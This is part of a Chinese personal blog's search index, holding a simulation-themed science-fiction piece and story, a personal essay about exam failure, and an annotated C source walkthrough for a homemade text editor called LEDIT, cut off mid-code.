/>\n“今天，我要告诉大家一个残酷且严肃的事实。我们可能生活在梦中，我们可能正在意识到梦魇的发生与出现，随时可以被别人所轻而易举地抹杀。而且，似乎我们有足够的理由。”扎克伯格道：“我认为我们在一个计算机模拟的‘游戏’中。我们知道，在计算机中保存浮点数并非真正的实数，而是离散的i.e.存在最小的在正浮点数。我们的宇宙也是如此，早在1900年，马克斯·普朗克发现普朗克常数并推生出量子力学时，就意味着我们的世界并不是无限可分的，而是存在最小的i.e.普朗克常数。”<br />\n“编写过大型游戏的都知道，为我们不可能在同时预处理和渲染所有的画面，为了性能，我们通常把玩家非关注的部分作优化处理，而玩家聚焦的部分精确渲染与绘制。如果第一个观点是正确的话——也就是说，我们的世界是渲染的，那就意味系统的计算能力有限，那它应该会采用这种优化方式。的确，它采用了，有力的证明就是光的波粒二象性，当我们观察时，根据不确定性理论，光会精确变成粒子模型，而当我们不关注时，系统会用简单的波动模型来渲染，以节省能耗。”<br />\n“最后一点证明也是最简单的，我们知道，任何一台计算机具有运算上限，这也就是所谓的光速存在的理由，这是一个硬伤，当然从一种角度来说，也保护了系统。”扎克伯格说：“虽然，我们处境不容乐观，但是，我们还没有到灭绝的地步，因为设计这个系统的文明还没有强大到如此般的地步。而且，我们既然存在，这就意味着系统很早就该发现我们的想法——他们具有上帝视角，因此，我们可以继续发展，只要在这个系统内扩张，我们都不会有太大的问题。但我们必须紧张起来。这是自由人以及整个人类的关键节点——我们发现了另一个文明，不是他死，就是我亡。”</p>\n"
    } ,
  
    {
      "title"    : "幕后 序章",
      "category" : "",
      "tags"     : "幕后系列, 随笔",
      "url"      : "/jekyll/update/2017/07/03/%E5%B9%95%E5%90%8E-%E5%BA%8F%E7%AB%A0.html",
      "date"     : "2017-07-03 19:41:00 +0800",
      "content"  : "<p>A First Star: <audio src=\"/music/A First Star.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n<br /></p>\n<hr />\n\n<p><br /></p>\n<blockquote>\n  <p>在经典的宇宙认知中，人们认为宇宙是无限大的,没有起点也没有终点，时间也是以匀速流逝的。一切都是如此的平和而有序。既然如此，人类就什么都无法改变，也就什么都不需要操劳，因为这一切只有上帝的神力才能控制。而人们只需要享受其中就好了。<br />\n然而，事情并不像人们想象得那么简单。20世纪，爱因斯坦提出了相对论，随后的现代物理学告诉了人类：宇宙并非无限大，而时间也可以随着引力而改变。<br />\n经典的宇宙认知彻底崩塌——无限、永恒，这两个原本让人感到宽慰的词语也彻底消失了。上帝或许不再是真正的主宰。这一切是多么的让人欣喜——我们的世界可以由我们来控制！<br />\n但是事实上一切并不是如此的令人欣喜。虽然这一切是有限的，但是人类却无法探寻到宇宙的边际。<br />\n上帝不管<br />\n人类又无法企及<br />\n宇宙又处在一个相对稳定的状态下<br />\n这意为着什么？难道存在第二个上帝？一种拥有人类无法想象的技术或自然优势的高等生命控制着这个宇宙？</p>\n</blockquote>\n\n<p>坐标：GN-z11星系的中心 时间：地球纪元公元后1590年<br />\n这一年的某一天，伽利略要在比萨斜塔上做“两个铁球同时着地的实验”来证明”自由落体定律的正确性。<br />\nGN-z11星系《宇宙》控制中心物理分部的工作人员正在紧张地工作着。因为这一天，他们要对物理引擎做一个全面的架构更新，以适应“自由落体定律”，否则，一旦人类和其他虚拟文明无法证明这一定律，将会彻底使他们设计的物理理论的导向完全崩塌，整个《宇宙》也就得重构，控制中心辛辛苦苦运行了13276 GN纪元的《宇宙》也会彻底崩塌。<br />\n《宇宙》，最初的设计目的仅仅是为了测试超级计算机的最大性能。然而随着项目的发展，GN人渐渐发现，这个项目派生出了各种学科分支，似乎还有助于研究GN人所处的世界。这个巨大的项目很快得到了GNR-Gov（GN Republic Goverment,GN共和国政府）的支持，因为在其中可以测试许多有风险的行为，而”人类“”就被作为GN人在《宇宙》系统中的映射，是GN人的早期文明版本。只要GN世界中的计算机的运算速度进一步加快，GN人还可以很快地利用《宇宙》来预测GN人的未来……<br />\n地球时间AM 8:00左右，伽利略准备开始他的实验。经过物理分部的彻夜改动，物理引擎应该已经消除了这个BUG。这时，决定GN人命运，同时也是决定人类命运的历史性时刻到来了。<br />\n这一刻，伽利略在人类的注视下，也在GN人的注视下仍下了铁球，一个10磅，一个1磅。两个铁球同时着地了。人类发出了惊讶的感叹。</p>\n\n<p>与此同时，控制中心的观察员也在密切观察者《宇宙》中比萨斜塔这个不起眼的地方的一举一动，Terminal（终端）上：</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>《宇宙》 控制终端-信息显示\nAM 8:37 34s  \n被观察物体：铁球A，铁球B  \n重力加速度相同  \n据地（地球表面）距离：10m\n\nAM 8:37 35.4s  \n被观察物体：铁球A，铁球B  \n重力加速度相同  \n据地（地球表面）距离：0m  \n</code></pre>\n</div>\n<p>同时落地了！控制中心内一阵欢呼，GN人度过了一次难关。<br />\n<br /></p>\n<hr />\n\n<p><br />\n坐标：GN-z11星系的中心 时间：GN纪元后世代25793年<br />\n数千GN纪元年过去了，GN世界的计算机也以摩尔定律飞速发展着。GN人也对AI(Artificial Intelligence,人工智能)也有了新的突破。依靠巨大的计算量，GN人暴力突破了神经网络与强化学习的不足，硬生生地让人工智能具有了自我意识与强大的智力。随后，GN人发明了更为强大的算法，发现了人脑为何能低计算量得高效处理数据的答案，GN人发明了“Star Mind”人工智能系统。随后，人工智能进入了新的高度，《宇宙》系统的大部分调试、监控、更新、维护工作也就交给了”Star Mind”，因为AI能更好地处理与完成这些工作。而控制中心地人数也由以前的上百万人减少至几百人的AI长期维护团队。<br />\n有一段时期，AI系统运行的非常稳定，近乎完美。这时，为何减少维护成本。这几百人地AI维护团队也进行了冬眠。这还有一个主要原因：为AI的完全自控积累经验与学习数据。很明显，这是要为《宇宙》系统的完全自控做准备。</p>\n\n<p>冬眠1000 GN纪元年后，维护团队苏醒。开始查看Star Mind的日志信息：</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>Star Mind journal|Star Mind 日志  \n……  \n地球年1609年 伽利略-发明望远镜  \nS-M系统警告：计算机系统贴图范围小于伽利略望远镜观测范围  \nS-M系统自操作：正在生成星空贴图…完成\n地球年1609年 伽利略-观察星空  \nS-M系统反馈：成功修复  \n……  \n地球年1831年 英国-发明精密计时器  \nS-M系统警告：计算机时间系统无法适应不同日出状态  \nS-M系统自操作：正在自编写TimeZone（时区）系统…完成  \n地球年1831年 英国-小猎犬号-精密计时器成功适应时区系统  \nS-M系统反馈：成功修复  \n……  \n地球年1894年 德国-马克斯·普朗克进行热辐射规律研究，企图得到普朗克常数  \nS-M系统严重警告：高精度研究可能导致栈溢出，导致小范围系统崩溃  \nS-M系统自操作：正在热更新系统-重新定义常数精度（减少常数精度）…完成  \n地球年1900年 德国-马克斯·普朗克得到普朗克常数，在精度范围内  \nS-M系统反馈：成功修复  \n…\n</code></pre>\n</div>\n<p>“虽然多次触发警告系统，甚至多次触发一级或严重警告，但是都成功修复了，现在看来系统是很完善了。可以完全自控一大段时间了，只要定期有人检查日志就可以了”《宇宙》系统的总架构设计师及项目主管双眼看着屏幕说道。<br />\n“很好，我们可以开Celebrate Party（庆祝派对）了。”</p>\n\n<p>庆祝派对很隆重，GNR-Gov的元首也到来了。经过设计师精心设计的S-M形象跳跃在屏幕上，很是具有活力。数百万的《宇宙》系统的前任以及现任员工在会场等待着这一具有历史意义的时刻——元首授权S-M系统完全接管《宇宙》系统。</p>\n\n<p>”今天，这是具有划时代意义的，着一时刻不仅是我们的荣耀，更值得整个星系骄傲与自豪！”元首道。随即就是一阵掌声。\n“感谢在座的各位过去与现在对《宇宙》系统的付出，你们是具有无上荣耀的，不论是过去、现在、还是未来，世世代代的GN人都会永远地铭记你们为GN星系和整个GNR作出的贡献。”<br />\n“而现在，我们迎来了全新的S-M系统，他会替我们照看《宇宙》，接过在座各位手中胜利的火炬，继续为GNR作出贡献”元首的每一句话都有力，看起来，他从心底里有着自豪的感觉。<br />\n”现在，我宣布，新纪元的到来——来吧，S-M！”元首一边铿锵有力地说完这一句，一边启动生物识别系统。识别通过了！S-M接管了全《宇宙》！<br />\n“你好，我是S-M，明天由我创造！”<br />\n<br /></p>\n<hr />\n\n<p><br />\n未完待续<br />\nLEXUGE 2017-07-03于Starbucks</p>\n"
    } ,
  
    {
      "title"    : "向死而生，直面困难",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2017/06/25/%E5%90%91%E6%AD%BB%E8%80%8C%E7%94%9F-%E7%9B%B4%E9%9D%A2%E5%9B%B0%E9%9A%BE.html",
      "date"     : "2017-06-25 10:05:00 +0800",
      "content"  : "<p>Try Everything: <audio src=\"/music/Try Everything.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n<br /></p>\n\n<blockquote>\n  <p>失败并非成功之母，但却是失败之父。掌握失败的规律，直面困难，这远比从失败中吸取教训要重要的多得多。</p>\n</blockquote>\n\n<p>那一天，期中考试随着英语的结束而落下帷幕。记得这是我自始至终最灰暗的一天，最昏沉与混沌的一个下午。我从未品尝过如此的沉沦与痛苦。</p>\n\n<p>期中大考的结束，本应该是一件让人释然，心情愉悦的事情。而我也就要迎来久违的释然——我从学期开始就冥冥之中预感的最担心的事情，今天终于要发生了。我跟随我们班名列前茅的副班长向操场走去。虽然一路上我极力控制着我的情绪，但是我还是免不住抱怨几声。他似乎也看出了我的内心：“跑几圈吧，运动可以使人放松身心。”。我觉得有点道理，就和他一同上了跑道。</p>\n\n<p>我抬起腿与他一同跑着，我是多么地卖力，希望能跑出现实的诅咒。想逃出现实的牢笼，彼时，即使是逃避现实再苟且，我也幻想着能实现。一圈又一圈，事实上，运动并为能给我带来放松，只是能宣泄我的愤怒。操场四周的篮球场和一旁的绿茵场上传来欢乐，而我，却如乌云一般跑着。跑不出失败，跑不出无助，跑不出渴望。</p>\n\n<p>终于，跑完了，我的愤怒也宣泄殆尽，我跟随他进入了体育馆，虽然脚在走，但心却不在地上。看着他们打球，我发着呆，耳边充斥着嘈杂。而我却一遍一遍地计算着总分，一次一次地不相信，一次一次地期盼着算错，期盼着这只是一场梦。我无数次想哭泣，但却又哭不出来。</p>\n\n<p>无助带来的空虚一次次像摄魂怪一般摄人心魂，而我早已没了知觉，也不再感到疼痛。</p>\n\n<p>这一切的困难与挫折，是偶然，也是必然。都是源于我的自大与蔑视，事实上，任何事都重要但也都不重要——不可过分看重也不可过度轻视。回想起自己的过错，便懂得失败的警醒。</p>\n\n<p>事后我再也不敢想象当初的感觉。但转念一想，这 其实并不可怕，因为经历过，自然就不会怕了，许多时候要学会忘去痛苦，吸取经验——“休对故人思故国，且将新火试新茶。诗酒趁年华。”。那一次，我没有退缩，而是选择直面。尽管，我输得很惨。在后续的半学期中，我无数次又被打倒，甚至怀疑这是否可能，但是每当遇到困难，我都会想到那次经历，这时，我又会站起来。</p>\n\n<p>邻近期末，我又一次与他奔跑在跑道上，这一次，我不再无助，更不会逃避，我要向死而生，直面困难——“长风破浪会有时，直挂云帆济沧海！”</p>\n"
    } ,
  
    {
      "title"    : "LEDIT代码详解&amp;&amp;移植指南",
      "category" : "",
      "tags"     : "编程, 项目",
      "url"      : "/jekyll/update/2017/04/23/LEDIT%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%A7%A3&&%E7%A7%BB%E6%A4%8D%E6%8C%87%E5%8D%97.html",
      "date"     : "2017-04-23 20:02:00 +0800",
      "content"  : "<blockquote>\n  <p>伴随着LEDIT新版本的发布，代码发生了翻天覆地的重构。为了让使用者及改编者能更清晰地阅读和移植代码。特写此文。</p>\n</blockquote>\n\n<h2 id=\"功能实现指南\">功能实现指南</h2>\n\n<h3 id=\"--函数用途\">- 函数用途：</h3>\n<ol>\n  <li><code class=\"highlighter-rouge\">int check();</code><br />\n此函数用来模拟format函数(不做任何实际改动)获得改动后的行数来确定有没有超出规范(dheight)</li>\n  <li><code class=\"highlighter-rouge\">void pull(int temp);</code><br />\n此函数用于将从a数组第temp个元素(包括temp)开始的元素都往前移动一个位置，最后一个赋值为\\0</li>\n  <li><code class=\"highlighter-rouge\">void format();</code><br />\n此函数用于为文本数组a创建对应的key point并储存在数组width中，以及创建行数(height)</li>\n  <li><code class=\"highlighter-rouge\">int sum(int x);</code><br />\n此函数用于获取到第x行最后一个字符为止(包括最后一个)，前面共有几个字符</li>\n  <li>\n    <p><code class=\"highlighter-rouge\">void push(int temp);</code><br />\n此函数用于将从a数组第temp个元素(包括temp)开始的元素都往后移动一个位置</p>\n  </li>\n  <li><code class=\"highlighter-rouge\">int conv(int x1,int y1);</code><br />\n此函数用于获取第x1行,第y1列表示数组a中的第几个字符。函数调用sum函数</li>\n  <li><code class=\"highlighter-rouge\">void fr();</code><br />\n此函数用于读取文件(并根据用户提供的密钥解密),函数具有输入保护功能，但无法保护输入密钥过大而导致的内存溢出</li>\n  <li><code class=\"highlighter-rouge\">void fw();</code><br />\n此函数用于写入文件(并根据用户提供的密钥加密),函数具有输入保护功能，但无法保护输入密钥过大而导致的内存溢出</li>\n  <li><code class=\"highlighter-rouge\">int key(char ch);</code><br />\n此函数用于存储用户输入的字符到数组a并包含一系列的保护处理</li>\n  <li><code class=\"highlighter-rouge\">int ctrkey(char ch);</code><br />\n此函数用于处理用户输入的特殊字符(换行符、Ctrl-r、Ctrl-w、Esc等)</li>\n  <li><code class=\"highlighter-rouge\">int cursor(char ch);</code><br />\n此函数用于处理光标</li>\n  <li><code class=\"highlighter-rouge\">void prin(int n);</code><br />\n此函数用于更新屏幕输出</li>\n  <li><code class=\"highlighter-rouge\">void init();</code><br />\n此函数用于初始化</li>\n</ol>\n\n<h3 id=\"--移植指南\">- 移植指南：</h3>\n<p>警告，在windows下编译需要Turbo C3.0环境</p>\n<ol>\n  <li>删除<code class=\"highlighter-rouge\">void gotoxy(int x,int y)</code>，<code class=\"highlighter-rouge\">void clrscr()</code>,<code class=\"highlighter-rouge\">int getch()</code>函数实现并包含conio.h头文件。</li>\n  <li>按照EDIT的代码更新<code class=\"highlighter-rouge\">int cursor(char ch)</code>和<code class=\"highlighter-rouge\">int ctrkey(char ch)</code>的键值。</li>\n  <li>删除void prin(int n)的行末特判</li>\n</ol>\n\n<h2 id=\"代码详解\">代码详解</h2>\n<div class=\"language-c highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"cp\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;//包含头文件\n</span>\n<span class=\"c1\">//声明全局变量\n</span>\n<span class=\"kt\">int</span> <span class=\"n\">width</span><span class=\"p\">[</span><span class=\"mi\">3001</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"p\">{</span><span class=\"mi\">0</span><span class=\"p\">};</span><span class=\"c1\">//key point信息\n</span><span class=\"kt\">int</span> <span class=\"n\">height</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"c1\">//编辑内容高度\n</span><span class=\"kt\">int</span> <span class=\"n\">dwidth</span><span class=\"o\">=</span><span class=\"mi\">80</span><span class=\"p\">;</span><span class=\"c1\">//最大列数\n</span><span class=\"kt\">int</span> <span class=\"n\">dheight</span><span class=\"o\">=</span><span class=\"mi\">300</span><span class=\"p\">;</span><span class=\"c1\">//最大行数\n</span><span class=\"kt\">int</span> <span class=\"n\">dstart</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"c1\">//输出内容开始行\n</span><span class=\"kt\">int</span> <span class=\"n\">maxlen</span><span class=\"o\">=</span><span class=\"mi\">24000</span><span class=\"p\">;</span><span class=\"c1\">//数组元素上限\n</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"c1\">//行列变量\n</span><span class=\"kt\">char</span> <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"mi\">24002</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"p\">{};</span><span class=\"c1\">//文本数组\n</span>\n<span class=\"c1\">//函数原型\n</span>\n<span class=\"kt\">int</span> <span class=\"n\">check</span><span class=\"p\">();</span><span class=\"c1\">//此函数用来模拟format函数(不做任何实际改动)获得改动后的行数来确定有没有超出规范(dheight)\n</span><span class=\"kt\">void</span> <span class=\"n\">pull</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">temp</span><span class=\"p\">);</span><span class=\"c1\">//此函数用于将从a数组第temp个元素(包括temp)开始的元素都往前移动一个位置，最后一个赋值为\\0\n</span><span class=\"kt\">void</span> <span class=\"n\">format</span><span class=\"p\">();</span><span class=\"c1\">//此函数用于为文本数组a创建对应的key point并储存在数组width中，以及创建行数(height)\n</span><span class=\"kt\">int</span> <span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">);</span><span class=\"c1\">//此函数用于获取到第x行最后一个字符为止(包括最后一个)，前面共有几个字符\n</span><span class=\"kt\">void</span> <span class=\"n\">push</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">temp</span><span class=\"p\">);</span><span class=\"c1\">//此函数用于将从a数组第temp个元素(包括temp)开始的元素都往后移动一个位置\n</span><span class=\"kt\">int</span> <span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">x1</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">y1</span><span class=\"p\">);</span><span class=\"c1\">//此函数用于获取第x1行,第y1列表示数组a中的第几个字符。函数调用sum函数\n</span><span class=\"kt\">void</span> <span class=\"n\">fr</span><span class=\"p\">();</span><span class=\"c1\">//此函数用于读取文件(并根据用户提供的密钥解密),函数具有输入保护功能，但无法保护输入密钥过大而导致的内存溢出\n</span><span class=\"kt\">void</span> <span class=\"n\">fw</span><span class=\"p\">();</span><span class=\"c1\">//此函数用于写入文件(并根据用户提供的密钥加密),函数具有输入保护功能，但无法保护输入密钥过大而导致的内存溢出\n</span><span class=\"kt\">int</span> <span class=\"n\">non</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">);</span>\n<span class=\"kt\">int</span> <span class=\"n\">key</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">);</span><span class=\"c1\">//此函数用于存储用户输入的字符到数组a并包含一系列的保护处理\n</span><span class=\"kt\">int</span> <span class=\"n\">ctrkey</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">);</span><span class=\"c1\">//此函数用于处理用户输入的特殊字符(换行符、Ctrl-r、Ctrl-w、Esc等)\n</span><span class=\"kt\">int</span> <span class=\"n\">cursor</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">);</span><span class=\"c1\">//此函数用于处理光标\n</span><span class=\"kt\">void</span> <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">);</span><span class=\"c1\">//此函数用于更新屏幕输出\n</span><span class=\"kt\">void</span> <span class=\"n\">init</span><span class=\"p\">();</span><span class=\"c1\">//此函数用于初始化\n</span>\n<span class=\"c1\">//函数实现\n</span>\n<span class=\"kt\">int</span> <span class=\"nf\">check</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"n\">t</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"k\">while</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">!=</span><span class=\"sc\">'\\0'</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">==</span><span class=\"sc\">'\\n'</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">t</span><span class=\"o\">++</span><span class=\"p\">;</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;}</span>\n    <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">temp</span><span class=\"o\">==</span><span class=\"n\">dwidth</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">t</span><span class=\"o\">&lt;</span><span class=\"n\">dheight</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">t</span><span class=\"o\">++</span><span class=\"p\">;</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;}}</span>\n    <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"n\">temp</span><span class=\"o\">++</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">t</span><span class=\"o\">&gt;</span><span class=\"n\">dheight</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"k\">else</span> <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">pull</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">temp</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"n\">temp</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"p\">);</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">format</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"n\">t</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"n\">height</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">while</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">!=</span><span class=\"sc\">'\\0'</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">==</span><span class=\"sc\">'\\n'</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">t</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">temp</span><span class=\"p\">;</span><span class=\"n\">t</span><span class=\"o\">++</span><span class=\"p\">;</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;}</span>\n    <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">temp</span><span class=\"o\">==</span><span class=\"n\">dwidth</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">t</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">dwidth</span><span class=\"p\">;</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">t</span><span class=\"o\">&lt;</span><span class=\"n\">dheight</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">t</span><span class=\"o\">++</span><span class=\"p\">;</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;}}</span>\n    <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"n\">temp</span><span class=\"o\">++</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">==</span><span class=\"sc\">'\\0'</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">t</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">temp</span><span class=\"p\">;</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;}</span>\n  <span class=\"n\">height</span><span class=\"o\">=</span><span class=\"n\">t</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">sum</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">sum</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">x</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"n\">sum</span><span class=\"o\">+=</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span>\n  <span class=\"k\">return</span> <span class=\"n\">sum</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">push</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">temp</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"p\">);</span><span class=\"n\">i</span><span class=\"o\">&gt;=</span><span class=\"n\">temp</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">--</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">conv</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">x1</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">y1</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">return</span> <span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"n\">x1</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"n\">y1</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">init</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">x</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">maxlen</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">i</span><span 